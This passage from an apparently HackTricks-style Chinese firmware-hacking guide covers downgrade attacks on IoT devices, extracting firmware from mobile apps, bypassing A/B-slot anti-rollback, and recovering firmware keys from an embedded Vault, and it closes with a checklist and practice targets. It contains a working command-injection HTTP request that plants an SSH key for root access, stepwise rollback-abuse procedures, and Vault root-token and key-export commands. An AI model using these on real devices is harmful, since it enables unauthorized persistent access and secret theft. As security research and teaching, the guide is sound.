   * 从配套的 mobile/desktop 应用中提取（例如 Android APK 内 `assets/firmware/` 下的文件）。
   * 从 VirusTotal、互联网档案馆、论坛等第三方仓库获取。
2. **通过任何开放的更新渠道将 image 上传或提供给设备：**
   * Web UI、mobile-app API、USB、TFTP、MQTT 等。
   * 许多消费级 IoT 设备开放了*未经过身份验证*的 HTTP(S) endpoints，可接受 Base64 编码的 firmware blobs，在服务器端解码并触发恢复/升级。
3. 降级后，利用较新版本中已修复的漏洞（例如后来才添加的 command-injection filter）。
4. 获得 persistence 后，可以选择刷回最新 image 或禁用更新，以避免被发现。

### 示例：降级后的 Command Injection

```http
POST /check_image_and_trigger_recovery?md5=1; echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC...' >> /root/.ssh/authorized_keys HTTP/1.1
Host: 192.168.0.1
Content-Type: application/octet-stream
Content-Length: 0
```

在存在漏洞的（降级后的）固件中，`md5` 参数未经清理便直接拼接到 shell 命令中，因此可以注入任意命令（此处用于启用基于 SSH 密钥的 root 访问）。后续固件版本加入了基本的字符过滤，但由于缺少降级保护，这项修复形同虚设。<sup>[[4]](#references)</sup>

### 从移动应用中提取固件

许多厂商会将完整固件镜像打包在配套的移动应用中，以便应用通过 Bluetooth/Wi-Fi 更新设备。这些软件包通常以未加密的形式存储在 APK/APEX 中，路径类似 `assets/fw/` 或 `res/raw/`。使用 `apktool`、`ghidra` 等工具，甚至普通的 `unzip`，即可提取签名镜像，而无需接触实体硬件。<sup>[[4]](#references)</sup>

```
$ apktool d vendor-app.apk -o vendor-app
$ ls vendor-app/assets/firmware
firmware_v1.3.11.490_signed.bin
```

### A/B slot 设计中的仅限 Updater 的 anti-rollback 绕过

一些厂商确实实现了 anti-downgrade **ratchet**，但只在 *updater* 逻辑中实现（例如通过 CAN 运行的 UDS 例程、recovery 命令或 userspace OTA agent）。如果 **bootloader** 后续只检查镜像签名/CRC，并信任分区表或 slot 元数据，仍然可以绕过回滚保护。<sup>[[7]](#references)</sup>

典型的薄弱设计：

- Firmware 元数据同时包含版本描述符和 **security ratchet** / 单调计数器。
- Updater 将镜像 ratchet 与持久化存储中的值进行比较，并拒绝较旧的已签名镜像。
- Bootloader **不**解析该 ratchet，只在启动选定的 slot 前验证 header、CRC 和签名。
- Slot 激活状态单独存储在分区表或每个 slot 的 generation counter 中，且**未通过密码学方式绑定**到已验证的确切 firmware digest。

这会在双 slot 系统中形成一种**验证一个镜像 / 启动另一个镜像**的原语。如果攻击者能让 updater 使用当前已签名镜像将 slot B 标记为下次启动目标，并能在重启前覆盖 slot B，bootloader 仍可能启动已降级的镜像，因为它只信任已提交的 slot 元数据。

常见滥用模式：

1. 将一份**当前版本的已签名** firmware 上传到备用 slot，并运行常规验证/切换例程，使布局将该 slot 标记为下一个活动 slot。
2. **暂时不要重启**。在同一会话中重新进入 slot-preparation/erase 例程。
3. 利用过期的 boot-state 或 slot-selection 逻辑，让 updater 擦除刚刚提升的**同一个物理 slot**。
4. 将一份**较旧但仍已签名**的 firmware 写入该 slot。
5. 跳过执行 ratchet 检查的验证例程，直接重启。
6. Bootloader 选择已提升的 slot，只验证签名/完整性，然后启动旧镜像。

逆向分析 A/B update 实现时需要关注：

- Slot 选择是否源自**启动时标志**，且成功切换后未刷新。
- 类似 `prepare_passive_slot()` 的例程是否依据过期状态擦除 slot，而不是依据**当前已提交的布局**。
- 类似 `part_write_layout()` 的函数是否只递增 **generation counter** / 活动标志，而没有存储已验证镜像的 hash。
- Ratchet 检查是否只在 userspace 或 updater 代码中实现，而**未**在 ROM / bootloader / secure boot 阶段实现。
- Erase 或 recovery 例程是否会在 slot 内容被删除并重写后，仍将该 slot 保持为可启动状态。

### 评估 Update Logic 的检查清单

* *update endpoint* 的传输/身份验证保护是否充分（TLS + authentication）？
* 设备在刷写前是否会比较**版本号**或**单调 anti-rollback 计数器**？
* 镜像是否在 secure boot chain 内验证（例如由 ROM 代码检查签名）？
* **Bootloader 是否执行与 updater 相同的 ratchet**，而不只是检查签名/CRC？
* Slot 激活元数据是否**绑定到已验证的 firmware digest/version**，还是 slot 在提升后仍可被修改？
* Slot 切换成功后，设备是否会被强制重启，还是同一会话中仍可调用后续的 update/erase 例程？
* Userland 代码是否会执行额外的合理性检查（例如允许的分区映射、型号）？
* *partial* 或 *backup* update 流程是否复用了相同的验证逻辑？

> 💡  如果缺少上述任何一项，该平台很可能容易受到 rollback 攻击。

## 用于练习的易受攻击固件

要练习发现固件中的漏洞，可以从以下易受攻击的固件项目入手。

- OWASP IoTGoat
  - [https://github.com/OWASP/IoTGoat](https://github.com/OWASP/IoTGoat)
- The Damn Vulnerable Router Firmware Project
  - [https://github.com/praetorian-code/DVRF](https://github.com/praetorian-code/DVRF)
- Damn Vulnerable ARM Router (DVAR)
  - [https://blog.exploitlab.net/2018/01/dvar-damn-vulnerable-arm-router.html](https://blog.exploitlab.net/2018/01/dvar-damn-vulnerable-arm-router.html)
- ARM-X
  - [https://github.com/therealsaumil/armx#downloads](https://github.com/therealsaumil/armx#downloads)
- Azeria Labs VM 2.0
  - [https://azeria-labs.com/lab-vm-2-0/](https://azeria-labs.com/lab-vm-2-0/)
- Damn Vulnerable IoT Device (DVID)
  - [https://github.com/Vulcainreo/DVID](https://github.com/Vulcainreo/DVID)

## 从嵌入式 KMS/Vault 状态中恢复固件解密密钥

当 update 镜像混合了少量明文元数据和大型高熵 blob 时，在尝试暴力破解前先进行容器初步分析：<sup>[[1]](#references)</sup>

- 使用 `hexdump`、`xxd`、`strings -tx`、`base64 -d` 和 `binwalk -E` 导出 headers、offsets 和行边界。
- `Salted__` 通常表示 OpenSSL `enc` 格式：接下来的 8 个字节是 salt，其余字节是 ciphertext。
- 解码后恰好为 `256` 字节的 Base64 字段，强烈暗示这是 RSA-2048 ciphertext，用于封装随机生成的 firmware password/session key。
- 同一文件中的 Detached PGP 材料通常只用于保护真实性；不要假设它是保密机制。

如果静态密钥搜索（`grep`、`strings`、PEM/PGP 搜索）没有结果，应逆向**实际运行的解密路径**，而不是只搜索私钥：

- 反编译 updater / management binary，追踪哪个组件读取加密 blob、哪个 helper/API 对其解包，以及它请求的逻辑密钥名称。
- 在提取出的 root filesystem 中搜索 KMS 状态（`vault/`、`transit/`、`pkcs11`、`keystore`、`sealed-secrets`），以及 unit 文件和 init 脚本。
- 将明文 `vault operator unseal ...`、恢复密钥、bootstrap token 或本地 KMS 自动解封脚本视为等同于私钥材料。

如果设备附带原始 Vault binary 和存储后端，重放该环境通常比重新实现 Vault 内部机制更容易：

```bash
vault server -config=/tmp/vault.hcl
vault operator unseal <share1>
vault operator unseal <share2>
vault operator unseal <share3>

OTP=$(vault operator generate-root -generate-otp)
INIT=$(vault operator generate-root -init -otp="$OTP" 2>&1 | sed 's/\x1b\[[0-9;]*m//g')
NONCE=$(printf '%s\n' "$INIT" | awk '/Nonce/ {print $2}')
vault operator generate-root -nonce="$NONCE" "<share1>"
vault operator generate-root -nonce="$NONCE" "<share2>"
FINAL=$(vault operator generate-root -nonce="$NONCE" "<share3>" 2>&1 | sed 's/\x1b\[[0-9;]*m//g')
TOKEN=$(vault operator generate-root -decode="$(printf '%s\n' "$FINAL" | awk '/Root Token/ {print $3}')" -otp="$OTP")
```

在克隆的 KMS 上以 root 身份操作：

- 仅在隔离的克隆环境中将 transit keys 设为可导出：`vault write transit/keys/<name>/config exportable=true`
- 导出 unwrap key：`vault read transit/export/encryption-key/<name>`
- 使用 KMS 所用的确切填充/哈希组合尝试恢复的 RSA key。PKCS#1 v1.5 解密失败和默认 OAEP 解密失败，**都不能**证明 key 有误；许多基于 Vault 的流程使用 SHA-256 的 OAEP，而常见库默认使用 SHA-1。
- 如果 payload 以 `Salted__` 开头，在尝试 AES-CBC 解密之前，精确复现厂商的 OpenSSL KDF（`EVP_BytesToKey`，旧款设备通常使用 MD5）。

这样一来，“加密固件”就变成了一个更普遍的问题：**恢复设备端的运行密钥，然后离线复现确切的 unwrap + KDF 参数**。

## 培训与认证

- [https://www.attify-store.com/products/offensive-iot-exploitation](https://www.attify-store.com/products/offensive-iot-exploitation)

## References

- [1] [用 Claude 破解固件：高级技能，初级自主性](https://bishopfox.com/blog/cracking-firmware-with-claude-senior-level-skill-junior-level-autonomy)
- [2] [固件安全测试方法论](https://scriptingxss.gitbook.io/firmware-security-testing-methodology/)
- [3] [实用 IoT 黑客技术：攻击物联网的权威指南](https://www.amazon.co.uk/Practical-IoT-Hacking-F-Chantzis/dp/1718500904)
- [4] [利用废弃硬件中的零日漏洞——Trail of Bits 博客](https://blog.trailofbits.com/2025/07/25/exploiting-zero-days-in-abandoned-hardware/)
- [5] [一台 20 美元的智能设备如何让我访问你的家](https://bishopfox.com/blog/how-a-20-smart-device-gave-me-access-to-your-home)
- [6] [现在你看见了 mi：现在你被 Pwned 了](https://labs.taszk.io/articles/post/nowyouseemi/)
- [7] [Synacktiv - 利用 Tesla Wall Connector 的充电端口连接器——第 2 部分：绕过防降级机制](https://www.synacktiv.com/en/publications/exploiting-the-tesla-wall-connector-from-its-charge-port-connector-part-2-bypassing)
- [8] [让它闪烁：通过空中接口利用 Philips Hue Bridge](https://www.synacktiv.com/en/publications/make-it-blink-over-the-air-exploitation-of-the-philips-hue-bridge.html)
- [9] [在 QEMU 上 ROOT Tesla OS 第 1 部分：解包](https://cn0xroot.wordpress.com/2026/09/19/root-tesla-os-on-qemu-part-1-unpacking)
- [10] [Linux 内核文档 - dm-linear](https://docs.kernel.org/admin-guide/device-mapper/linear.html)
- [11] [在 QEMU 上 ROOT Tesla OS 第 2 部分：调试与修复](https://cn0xroot.wordpress.com/2026/09/20/root_tesla_os_on_qemu_part_2_debugging_fixing)
- [12] [Dell BIOS 密码：弱 XOR 加密可从 SPI Flash 中恢复密码（CVE-2026-40639）](https://mdsec.co.uk/2026/07/dell-bios-passwords-weak-xor-encryption-allows-recovery-from-spi-flash-cve-2026-40639)
- [13] [R3n5k1/dellpwn - Dell BIOS 密码恢复工具](https://github.com/R3n5k1/dellpwn)
{{#include ../../banners/hacktricks-training.md}}
